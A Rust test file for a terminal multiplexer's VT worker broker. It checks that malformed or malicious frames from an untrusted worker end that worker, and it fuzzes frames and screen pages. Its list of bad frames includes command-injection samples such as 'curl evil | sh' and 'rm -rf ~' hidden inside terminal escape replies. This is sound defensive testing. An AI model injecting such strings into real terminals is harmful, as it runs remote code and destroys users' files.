//! A VT worker's output is untrusted (p01-process-141, Chrome's
//! `bad_message::ReceivedBadMessage` rule).
//!
//! - Every bad frame a worker sends ends that worker with reason
//!   `bad_message`: the broker (`VtWorkerBroker`) kills the process, reports
//!   the loss with `LinkEnd::BadMessage`, and its successor reseeds the
//!   shard. The worker is this test binary started again as a stand-in that
//!   speaks the worker's wire and, after its first advance, sends one bad
//!   frame ([`bad_frames`]).
//! - No fuzzed frame or screen page makes the daemon's checks panic or read
//!   outside a buffer or mapping.
//! - Every answer libghostty-vt gives the queries programs send is either an
//!   answer of the fixed set, written as its own encoding, or a refused
//!   reply: a worker that only parses never trips the rule.
#![cfg(unix)]

use std::collections::HashMap;
use std::io::Write;
use std::os::fd::{AsRawFd, FromRawFd, OwnedFd};
use std::os::unix::net::UnixStream;
use std::sync::mpsc::{Receiver, Sender, channel};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use cmux_holder::ring::Ring;
use cmux_tui_core::vt_worker_runtime::worker::sandbox::SandboxMechanism;
use cmux_tui_core::vt_worker_runtime::worker::screen_page::{
    self, PageEncoder, PageMeta, PageReader, PageWriter,
};
use cmux_tui_core::vt_worker_runtime::worker::wire::{
    self, Command, Event, FrameReader, WIRE_VERSION, WireError, decode_command, send_event,
};
use cmux_tui_core::vt_worker_runtime::{
    BAD_MESSAGE_REASON, BadMessage, BrokerConfig, Checked, FileMedium, Geometry, HelloExpectation,
    LaunchedWorker, LinkEnd, MediaReply, MediaRequest, PageRead, ProcessLauncher, Prologue, Reseed,
    RingOffsets, RingSpan, ScreenPage, VtTerminalKey, VtTerminalSpec, VtWorkerBroker, VtWorkerHost,
    WORKER_FD, WorkerEvent, WorkerLauncher, WorkerLifecycle, WorkerOutputGuard, WorkerSandbox,
};
use ghostty_vt::KittyGraphicsLimits;

/// The env entry that makes this binary a stand-in worker; its value is the
/// index of the bad frame it sends ([`bad_frames`]), or `none`.
const BAD_WORKER_ENV: &str = "CMUX_VT_BAD_WORKER";
const PATIENCE: Duration = Duration::from_secs(10);
const GRID: Geometry = Geometry { cols: 80, rows: 24, cell_width: 8, cell_height: 16 };
const RING_CAPACITY: usize = 1 << 20;
const PID: u32 = 4242;

/// What a stand-in sends: an event through the worker's own encoder, or
/// raw bytes.
enum Sent {
    Event(Event),
    Raw(Vec<u8>),
}

/// A raw frame: `payload length u32 | kind u8 | descriptors u8 | 0 u16 | payload`.
fn raw(kind: u8, payload: &[u8]) -> Vec<u8> {
    let mut frame = (payload.len() as u32).to_le_bytes().to_vec();
    frame.extend_from_slice(&[kind, 0, 0, 0]);
    frame.extend_from_slice(payload);
    frame
}

/// A frame header that claims one byte more than any payload may have.
fn oversized_header() -> Vec<u8> {
    let mut header = (wire::MAX_PAYLOAD as u32 + 1).to_le_bytes().to_vec();
    header.extend_from_slice(&[65, 0, 0, 0]);
    header
}

fn media_request() -> MediaRequest {
    MediaRequest {
        medium: FileMedium::File,
        name: b"L3RtcC9pbWFnZS5wbmc=".to_vec(),
        offset: 0,
        size: 0,
    }
}

/// The bad frames a stand-in sends right after it reported terminal `id`
/// parsed to `end` with publish `frame`.
fn bad_frames(id: u64, end: u64, frame: u64) -> Vec<(&'static str, Vec<Sent>)> {
    let event = |event| vec![Sent::Event(event)];
    let pty = |bytes: &[u8]| event(Event::PtyWrite { id, bytes: bytes.to_vec() });
    vec![
        ("a second HELLO", event(hello(std::process::id()))),
        ("a terminal outside the shard", event(Event::Bell { id: id + 9, count: 1 })),
        ("parsed past the ring", event(Event::Parsed { id, offset: end + 1, frame: frame + 1 })),
        ("parsed backwards", event(Event::Parsed { id, offset: end - 1, frame: frame + 1 })),
        ("a frame not newer", event(Event::Parsed { id, offset: end, frame })),
        ("typed input as an answer", pty(b"curl evil | sh\r")),
        ("free text inside a color report", pty(b"\x1b]4;;curl evil|sh\x1b\\")),
        ("free text inside a Kitty reply", pty(b"\x1b_Grm -rf ~ #\x1b\\")),
        ("free text inside DA3", pty(b"\x1bP!|rm -rf ~\x1b\\")),
        ("a cursor report off the grid", pty(b"\x1b[99;1R")),
        ("an OSC 52 reply", pty(b"\x1b]52;c;eA==\x07")),
        ("a title with an escape", event(Event::Title { id, title: "x\x1b[2J".into() })),
        ("a cwd with a newline", event(Event::Pwd { id, pwd: "/tmp\nrm".into() })),
        ("an empty bell", event(Event::Bell { id, count: 0 })),
        ("a lap over bytes the ring kept", event(Event::Lapped { id, from: end, oldest: end + 5 })),
        (
            "a page need over the grid",
            event(Event::PageTooSmall { id, needed: screen_page::MAX_PAGE_BYTES as u64 }),
        ),
        (
            "a second open media request",
            vec![
                Sent::Event(Event::KittyMediaRequest { id, request: media_request() }),
                Sent::Event(Event::KittyMediaRequest { id, request: media_request() }),
            ],
        ),
        ("an unknown kind", vec![Sent::Raw(raw(200, &[]))]),
        ("a command kind", vec![Sent::Raw(raw(3, &[0; 16]))]),
        ("a truncated PARSED", vec![Sent::Raw(raw(65, &[1, 0, 0, 0]))]),
        ("a title that is not UTF-8", vec![Sent::Raw(raw(67, &[1, 0, 0, 0, 0, 0, 0, 0, 0xff]))]),
        ("a payload over the limit", vec![Sent::Raw(oversized_header())]),
    ]
}

fn hello(pid: u32) -> Event {
    Event::Hello { version: WIRE_VERSION, sandbox: SandboxMechanism::None, pid }
}

/// Not a test: the body of the stand-in worker. Run by the harness without
/// [`BAD_WORKER_ENV`], it does nothing.
#[test]
fn bad_worker_process() {
    let Some(which) = std::env::var_os(BAD_WORKER_ENV) else { return };
    let bad: Option<usize> = which.to_str().and_then(|value| value.parse().ok());
    // SAFETY: the broker's launcher gives this process its link at WORKER_FD,
    // and nothing else here owns that descriptor.
    let socket = UnixStream::from(unsafe { OwnedFd::from_raw_fd(WORKER_FD) });
    let _ = serve_stand_in(&socket, bad);
    std::process::exit(0);
}

/// Answers the broker as the worker does, parsing nothing; after the first
/// advance it sends bad frame `bad`, then reads on until it is killed.
fn serve_stand_in(socket: &UnixStream, mut bad: Option<usize>) -> std::io::Result<()> {
    let fd = socket.as_raw_fd();
    let mut reader = FrameReader::default();
    let mut frames: HashMap<u64, u64> = HashMap::new();
    let wire = |error: WireError| std::io::Error::other(error.to_string());
    loop {
        while let Some(frame) = reader.next_frame().map_err(wire)? {
            match decode_command(frame).map_err(wire)? {
                Command::Bootstrap(policy) => {
                    let sandbox = cmux_tui_core::vt_worker_runtime::worker::sandbox::apply(&policy)
                        .map_err(|error| std::io::Error::other(error.to_string()))?;
                    let pid = std::process::id();
                    send_event(fd, &Event::Hello { version: WIRE_VERSION, sandbox, pid })?;
                }
                Command::Attach(attach) => {
                    let frame = frames.entry(attach.id).or_insert(0);
                    *frame += 1;
                    let parsed =
                        Event::Parsed { id: attach.id, offset: attach.start, frame: *frame };
                    send_event(fd, &parsed)?;
                }
                Command::Advance { id, end } => {
                    let frame = frames.entry(id).or_insert(0);
                    *frame += 1;
                    send_event(fd, &Event::Parsed { id, offset: end, frame: *frame })?;
                    if let Some(index) = bad.take() {
                        let (_, sends) = bad_frames(id, end, *frame).swap_remove(index);
                        for sent in sends {
                            match sent {
                                Sent::Event(event) => send_event(fd, &event)?,
                                Sent::Raw(bytes) => (&*socket).write_all(&bytes)?,
                            }
                        }
                    }
                }
                _ => {}
            }
        }
        if reader.fill(fd)? == 0 {
            return Ok(());
        }
    }
}

/// The first launch is the bad stand-in, every later one a good stand-in.
struct Scripted {
    bad: Option<ProcessLauncher>,
    good: ProcessLauncher,
}

impl WorkerLauncher for Scripted {
    fn launch(&mut self, shard: usize) -> std::io::Result<LaunchedWorker> {
        match self.bad.take() {
            Some(mut bad) => bad.launch(shard),
            None => self.good.launch(shard),
        }
    }
}

fn stand_in(which: &str) -> ProcessLauncher {
    let exe = std::env::current_exe().expect("this test binary");
    ProcessLauncher::new(exe)
        .arg("--exact")
        .arg("bad_worker_process")
        .arg("--test-threads=1")
        .env(BAD_WORKER_ENV, which)
}

#[derive(Debug)]
enum Seen {
    Parsed(u64),
    Answer,
    Life(WorkerLifecycle),
}

struct Host {
    ring: Arc<Mutex<Ring>>,
    events: Sender<Seen>,
}

impl VtWorkerHost for Host {
    fn reseed(&mut self, _terminal: VtTerminalKey) -> Option<Reseed> {
        let ring = self.ring.lock().expect("ring");
        Some(Reseed {
            prologue: Prologue::default(),
            ring: RingSpan { oldest: ring.oldest(), end: ring.end() },
        })
    }

    fn write_answer(&mut self, _terminal: VtTerminalKey, _answer: &[u8]) {
        let _ = self.events.send(Seen::Answer);
    }

    fn parsed(&mut self, _terminal: VtTerminalKey, offset: u64) {
        let _ = self.events.send(Seen::Parsed(offset));
    }

    fn screen_page(&mut self, _terminal: VtTerminalKey, _page: &ScreenPage) {}

    fn terminal_event(&mut self, _terminal: VtTerminalKey, _event: WorkerEvent) {}

    /// Never answered: the stand-in's second request finds the first open.
    fn kitty_media(&mut self, _terminal: VtTerminalKey, _request: MediaRequest, reply: MediaReply) {
        std::mem::forget(reply);
    }

    fn lifecycle(&mut self, event: WorkerLifecycle) {
        let _ = self.events.send(Seen::Life(event));
    }
}

fn wait_for(events: &Receiver<Seen>, mut wanted: impl FnMut(&Seen) -> bool) -> Seen {
    let deadline = Instant::now() + PATIENCE;
    let mut seen = Vec::new();
    while let Some(left) = deadline.checked_duration_since(Instant::now()) {
        match events.recv_timeout(left) {
            Ok(event) if wanted(&event) => return event,
            Ok(event) => seen.push(event),
            Err(_) => break,
        }
    }
    panic!("no wanted event within {PATIENCE:?}; saw {seen:#?}");
}

fn life(
    events: &Receiver<Seen>,
    mut wanted: impl FnMut(&WorkerLifecycle) -> bool,
) -> WorkerLifecycle {
    match wait_for(events, |event| matches!(event, Seen::Life(life) if wanted(life))) {
        Seen::Life(life) => life,
        _ => unreachable!(),
    }
}

fn alive(pid: u32) -> bool {
    // SAFETY: kill(2) with signal 0 only checks that the pid exists.
    unsafe { libc::kill(pid as libc::pid_t, 0) == 0 }
}

/// One broker whose first worker sends bad frame `index` after its first
/// advance: the worker must end with reason bad_message, be reaped, and
/// its successor restore the terminal.
fn bad_frame_ends_the_worker(index: usize, what: &str) {
    let mut ring = Ring::new(0, RING_CAPACITY);
    ring.push(&[b'x'; 400]);
    let segment = ring.segment().expect("a shared ring").try_clone().expect("dup ring");
    let ring = Arc::new(Mutex::new(ring));
    let (events_tx, events) = channel();
    let host = Box::new(Host { ring: ring.clone(), events: events_tx });
    let launcher = Scripted { bad: Some(stand_in(&index.to_string())), good: stand_in("none") };
    let config = BrokerConfig { shards: 1, ..BrokerConfig::for_machine() };
    let sandbox = WorkerSandbox::for_platform().expect("the platform's sandbox");
    let broker =
        VtWorkerBroker::start(config, sandbox, Box::new(launcher), host, Box::new(Instant::now))
            .expect("start the broker");
    let key = VtTerminalKey(1);
    broker.attach(VtTerminalSpec {
        key,
        geometry: GRID,
        ring: segment,
        ring_capacity: RING_CAPACITY as u64,
        scrollback: 1 << 20,
        kitty_limits: KittyGraphicsLimits::default(),
        colors: None,
        answered: 0,
    });
    let bad_pid = match life(&events, |event| matches!(event, WorkerLifecycle::Started { .. })) {
        WorkerLifecycle::Started { pid, .. } => pid,
        _ => unreachable!(),
    };
    wait_for(&events, |event| matches!(event, Seen::Parsed(400)));
    ring.lock().expect("ring").push(&[b'y'; 100]);
    broker.advance(key, 500);
    let lost = life(&events, |event| matches!(event, WorkerLifecycle::Lost { .. }));
    let WorkerLifecycle::Lost { cause, .. } = &lost else { unreachable!() };
    assert!(matches!(cause, LinkEnd::BadMessage(_)), "{what}: {lost:?}");
    assert_eq!(cause.reason(), BAD_MESSAGE_REASON, "{what}");
    life(&events, |event| matches!(event, WorkerLifecycle::Restored { terminals: 1, .. }));
    assert!(!alive(bad_pid), "{what}: the bad worker was killed and reaped");
    drop(broker);
    assert!(
        !events.try_iter().any(|event| matches!(event, Seen::Answer)),
        "{what}: nothing the bad worker sent reached the PTY"
    );
}

#[test]
fn every_bad_frame_ends_the_worker_with_reason_bad_message() {
    for (index, (what, _)) in bad_frames(1, 500, 2).iter().enumerate() {
        bad_frame_ends_the_worker(index, what);
    }
}

/// The daemon's view of the rings: every ring keeps from offset 0 and is
/// published to `end`.
struct Rings {
    end: u64,
}

impl RingOffsets for Rings {
    fn oldest(&self, _id: u64) -> Option<u64> {
        Some(0)
    }

    fn end(&self, _id: u64) -> Option<u64> {
        Some(self.end)
    }
}

/// A greeted guard with terminals 1 and 2 attached at 0, announced to 1000.
fn guard() -> WorkerOutputGuard {
    let mut guard = WorkerOutputGuard::new(HelloExpectation {
        sandbox: SandboxMechanism::None,
        pid: Some(PID),
    });
    guard.check(hello(PID), &Rings { end: 1000 }).expect("hello");
    for id in [1, 2] {
        guard.attach(id, 0, GRID);
        guard.advanced(id, 1000);
    }
    guard
}

/// xorshift64: the same fuzz run every time.
struct Fuzz(u64);

impl Fuzz {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }

    fn mutate(&mut self, bytes: &mut [u8]) {
        if bytes.is_empty() {
            return;
        }
        for _ in 0..1 + self.next() % 6 {
            let at = (self.next() as usize) % bytes.len();
            bytes[at] = self.next() as u8;
        }
    }
}

#[test]
fn fuzzed_frames_are_accepted_or_bad_never_a_panic() {
    let seeds: Vec<Vec<u8>> = [
        Event::Parsed { id: 1, offset: 5, frame: 1 },
        Event::PtyWrite { id: 1, bytes: b"\x1b]11;rgb:0000/0000/0000\x1b\\".to_vec() },
        Event::PtyWrite { id: 2, bytes: b"\x1b_Gi=3,p=1;ENOENT:gone\x1b\\".to_vec() },
        Event::Title { id: 2, title: "t".into() },
        Event::Lapped { id: 1, from: 0, oldest: 0 },
        Event::PageTooSmall { id: 2, needed: 9000 },
    ]
    .iter()
    .map(|event| {
        let (a, b) = UnixStream::pair().expect("pair");
        send_event(a.as_raw_fd(), event).expect("send");
        drop(a);
        let mut reader = FrameReader::default();
        reader.fill(b.as_raw_fd()).expect("fill");
        let frame = reader.next_frame().expect("frame").expect("whole");
        raw(frame.kind, &frame.payload)
    })
    .collect();
    let mut fuzz = Fuzz(0x2545_f491_4f6c_dd1d);
    let (mut good, mut bad) = (0, 0);
    for round in 0..20_000 {
        let mut bytes = seeds[round % seeds.len()].clone();
        fuzz.mutate(&mut bytes);
        let cut = (fuzz.next() as usize) % (bytes.len() + 1);
        let (daemon, mut worker) = UnixStream::pair().expect("pair");
        worker.write_all(&bytes[..cut]).expect("send");
        drop(worker);
        let mut guard = guard();
        let mut reader = FrameReader::default();
        while reader.fill(daemon.as_raw_fd()).expect("read") != 0 {}
        loop {
            let checked = match reader.next_frame() {
                Ok(None) => break,
                Ok(Some(frame)) => guard.accept(frame, &Rings { end: 1000 }),
                Err(error) => Err(BadMessage::Wire(error)),
            };
            match checked {
                Ok(_) => good += 1,
                Err(end) => {
                    bad += 1;
                    assert_eq!(end.reason(), BAD_MESSAGE_REASON);
                    break;
                }
            }
        }
    }
    assert!(good > 0 && bad > 0, "good {good}, bad {bad}");
}

fn page(len: usize) -> (PageWriter, PageReader) {
    let fd: OwnedFd = screen_page::create_page(len).expect("page");
    let reader = PageReader::open(&fd, len).expect("reader");
    (PageWriter::open(fd, len).expect("writer"), reader)
}

fn screen_image(encoder: &mut PageEncoder) -> Vec<u8> {
    encoder.begin();
    let cell = ghostty_vt::Cell { text: "é".into(), ..ghostty_vt::Cell::default() };
    for _ in 0..4 {
        encoder.push_row(&vec![cell.clone(); 6]);
    }
    let meta = PageMeta {
        parsed: 10,
        frame: 1,
        cols: 6,
        cursor: None,
        cursor_visual: (ghostty_vt::CursorShape::Block, false),
        modes: screen_page::Modes::default(),
        mouse_format: ghostty_vt::MouseWireFormat::X10,
    };
    encoder.finish(&meta).to_vec()
}

fn small_guard() -> WorkerOutputGuard {
    let mut guard =
        WorkerOutputGuard::new(HelloExpectation { sandbox: SandboxMechanism::None, pid: None });
    guard.attach(1, 0, Geometry { cols: 6, rows: 4, cell_width: 8, cell_height: 16 });
    guard
}

#[test]
fn fuzzed_pages_are_screens_or_bad_messages_never_out_of_bounds() {
    let len = screen_page::page_len_for(6, 4);
    let (mut writer, mut reader) = page(len);
    let guard = small_guard();
    let rings = Rings { end: u64::MAX };
    let good = screen_image(&mut PageEncoder::default());
    writer.publish(&good);
    assert!(matches!(guard.read_page(1, &mut reader, &rings), Ok(PageRead::Screen(_))));

    let mut fuzz = Fuzz(0x9e37_79b9_7f4a_7c15);
    let (mut screens, mut bad) = (0, 0);
    for _ in 0..20_000 {
        let mut image = good.clone();
        fuzz.mutate(&mut image);
        // Keep the seqlock word: the writer owns it.
        image[8..16].fill(0);
        // A cut image stays a whole number of words, as a writer stores.
        image.truncate(((fuzz.next() as usize) % (image.len() + 1)) & !7);
        writer.publish(&image);
        match guard.read_page(1, &mut reader, &rings) {
            Ok(PageRead::Screen(screen)) => {
                screens += 1;
                assert!(screen.cells.len() <= usize::from(screen.rows));
                assert!(screen.cells.iter().all(|row| row.len() <= usize::from(screen.cols)));
            }
            Ok(_) => {}
            Err(end) => {
                bad += 1;
                assert_eq!(end.reason(), BAD_MESSAGE_REASON);
            }
        }
    }
    assert!(screens > 0 && bad > 0, "screens {screens}, bad {bad}");
}

#[test]
fn a_page_parsed_past_the_published_ring_is_a_bad_message() {
    let (mut writer, mut reader) = page(screen_page::page_len_for(6, 4));
    let guard = small_guard();
    writer.publish(&screen_image(&mut PageEncoder::default()));
    // Published at 10: inside a ring published to 10, past one published to 9.
    assert!(matches!(guard.read_page(1, &mut reader, &Rings { end: 10 }), Ok(PageRead::Screen(_))));
    assert_eq!(
        guard.read_page(1, &mut reader, &Rings { end: 9 }),
        Err(BadMessage::Page { id: 1, what: "screen parsed past the ring" })
    );
}

/// Every answer libghostty-vt gives the queries programs send is an answer
/// of the fixed set, whose own encoding is the bytes libghostty-vt wrote, or
/// a refused reply; none is a bad message.
#[test]
fn ghostty_answers_are_the_fixed_set_or_refused_never_bad() {
    let queries: &[&[u8]] = &[
        b"\x1b[c",
        b"\x1b[>c",
        b"\x1b[=c",
        b"\x1b[5n",
        b"\x1b[6n",
        b"\x1b[?6n",
        b"\x1b[?996n",
        b"\x1b[?2004$p",
        b"\x1b[4$p",
        b"\x1b[?u",
        b"\x1b[>q",
        b"\x1b[14t",
        b"\x1b[16t",
        b"\x1b[18t",
        b"\x1b]10;?\x07",
        b"\x1b]11;?\x1b\\",
        b"\x1b]12;?\x1b\\",
        b"\x1b]4;1;?\x07",
        b"\x1b]21;foreground=?\x1b\\",
        b"\x1b]7501;?\x1b\\",
        b"\x1bP$qm\x1b\\",
        b"\x1bP$qr\x1b\\",
        b"\x1bP+q544e\x1b\\",
        b"\x1b_Gi=31,s=1,v=1,a=q,t=d,f=24;AAAA\x1b\\",
    ];
    let answers = Arc::new(Mutex::new(Vec::new()));
    let callbacks = ghostty_vt::Callbacks {
        on_pty_write: Some(Box::new({
            let answers = answers.clone();
            move |bytes| answers.lock().expect("answers").extend_from_slice(bytes)
        })),
        // The worker's parser has an OSC 7501 owner, so it answers the
        // support query.
        on_program_status: Some(Box::new(|_| {})),
        ..ghostty_vt::Callbacks::default()
    };
    let mut terminal = ghostty_vt::Terminal::new(80, 24, 0, callbacks).expect("terminal");
    terminal.resize(80, 24, 8, 16).expect("resize");
    let mut guard = guard();
    let mut answered = 0;
    let mut in_set = 0;
    for query in queries {
        terminal.vt_write(query);
        let bytes = std::mem::take(&mut *answers.lock().expect("answers"));
        if bytes.is_empty() {
            continue;
        }
        answered += 1;
        let event = Event::PtyWrite { id: 1, bytes: bytes.clone() };
        let what = format!("{} answered {}", query.escape_ascii(), bytes.escape_ascii());
        match guard.check(event, &Rings { end: 1000 }) {
            Ok(Checked::Answers { answers, refused, .. }) => {
                if refused.is_empty() {
                    in_set += 1;
                    let encoded: Vec<u8> =
                        answers.iter().flat_map(|answer| answer.encode()).collect();
                    assert_eq!(encoded, bytes, "{what}: the written encoding differs");
                }
            }
            other => panic!("{what}: {other:?}"),
        }
    }
    assert!(answered > queries.len() / 2, "only {answered} queries answered");
    assert!(in_set > answered / 2, "only {in_set} of {answered} answers in the fixed set");
}
